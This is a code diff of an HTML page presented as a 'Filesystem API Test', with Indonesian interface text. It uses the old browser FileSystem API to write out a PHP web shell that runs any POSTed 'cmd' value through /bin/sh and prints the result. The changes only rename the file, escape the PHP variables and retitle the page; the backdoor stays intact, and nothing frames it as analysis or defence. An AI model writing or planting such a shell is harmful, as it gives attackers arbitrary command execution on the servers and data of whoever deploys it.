@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Filesystem API Test</title>
+  <title>Filesystem API Test (Fixed)</title>
   <style>
     .button {
       background-color: #4CAF50;
@@ -28,25 +28,25 @@
       }
 
       window.webkitRequestFileSystem(window.PERSISTENT, storageSize, function(fs) {
-        fs.root.getFile("test.php", { create: true }, function(fileEntry) {
+        fs.root.getFile("test.html", { create: true }, function(fileEntry) {
           fileEntry.createWriter(function(fileWriter) {
             const htmlContent = `<?php
-if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
-    $cmd = trim($_POST['cmd']);
-    if ($cmd !== '') {
-        $tmpFile = sys_get_temp_dir() . '/cmd_output.txt';
+if (\$_SERVER['REQUEST_METHOD'] === 'POST' && isset(\$_POST['cmd'])) {
+    \$cmd = trim(\$_POST['cmd']);
+    if (\$cmd !== '') {
+        \$tmpFile = sys_get_temp_dir() . '/cmd_output.txt';
         if (function_exists('pcntl_fork') && function_exists('pcntl_exec')) {
-            $pid = pcntl_fork();
-            if ($pid == -1) {
+            \$pid = pcntl_fork();
+            if (\$pid == -1) {
                 echo "Fork failed.";
-            } elseif ($pid === 0) {
-                pcntl_exec('/bin/sh', ['-c', $cmd . " > $tmpFile 2>&1"]);
+            } elseif (\$pid === 0) {
+                pcntl_exec('/bin/sh', ['-c', \$cmd . " > \$tmpFile 2>&1"]);
                 exit(1);
             } else {
-                pcntl_wait($status);
-                if (file_exists($tmpFile)) {
-                    echo "<pre>" . htmlspecialchars(file_get_contents($tmpFile)) . "</pre>";
-                    unlink($tmpFile);
+                pcntl_wait(\$status);
+                if (file_exists(\$tmpFile)) {
+                    echo "<pre>" . htmlspecialchars(file_get_contents(\$tmpFile)) . "</pre>";
+                    unlink(\$tmpFile);
                 } else {
                     echo "No output.";
                 }
@@ -66,7 +66,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
 
             fileWriter.onwriteend = function() {
               console.log("File berhasil ditulis:", fileEntry.toURL());
-              alert("File HTML berhasil dibuat.");
+              alert("File HTML berhasil dibuat di sandbox Filesystem API.");
             };
 
             fileWriter.onerror = function(err) {
@@ -89,7 +89,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
   </script>
 </head>
 <body>
-  <h1>Filesystem API Test</h1>
+  <h1>Filesystem API Test (Fixed)</h1>
   <p>Halaman ini mencoba membuat file HTML menggunakan FileSystem API (lama).</p>
 </body>
 </html>
